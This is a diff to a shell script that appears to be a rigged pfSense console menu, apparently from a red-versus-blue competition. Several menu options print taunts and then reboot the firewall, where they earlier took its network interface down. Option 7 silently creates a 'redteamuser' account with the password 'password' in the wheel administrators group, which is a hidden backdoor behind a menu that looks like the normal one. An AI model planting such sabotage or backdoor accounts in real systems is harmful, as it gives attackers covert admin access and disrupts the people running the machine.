@@ -106,23 +106,23 @@ case ${opmode} in
 	exit && exit && logout
 	;;
 1)
-	echo "This is a rulebreak, did you ask whiteteam"
+	echo -e "This is a rulebreak, did you ask whiteteam\n"
 	;;
 2)
-	echo "This is a rulebreak, did you ask whiteteam"
+	echo -e "This is a rulebreak, did you ask whiteteam\n"
 	;;
 3)
 	/etc/rc.initial.password
 	;;
 4)
-	echo "Welp, now you're out of the competition"
-	ifconfig vtnet0 down
+	echo -e "Well that wouldn't be smart\n"
+	reboot
 	;;
 5)
 	/etc/rc.initial.reboot
 	;;
 6)
-	echo "Is that the best idea?"
+	echo -e "Is that the best idea?\n"
 	reboot
 	;;
 7)
@@ -132,10 +132,12 @@ case ${opmode} in
 	echo "This wouldn't be as fun if it were that easy"
     if id redteamuser >/dev/null 2>&1; then
         # redteamuser exists, just clear the screen
+        sleep 2
         clear
     else
         # redteamuser does NOT exist, create them
         echo "password" | pw useradd redteamuser -m -s /etc/rc.initial -c "user" -h 0 -G wheel >/dev/null 2>&1
+        sleep 2
         clear
     fi
 	;;
@@ -149,11 +151,11 @@ case ${opmode} in
 	/etc/rc.restart_webgui
 	;;
 12)
-	echo "Can you even code in php?"
+	echo -e "Can you even code in php?\n"
 	;;
 13)
 	echo "Don't worry I already updated it"
-	ifconfig vtnet0 down
+	reboot
 	;;
 14)
 	echo "Is that the smartest move?"
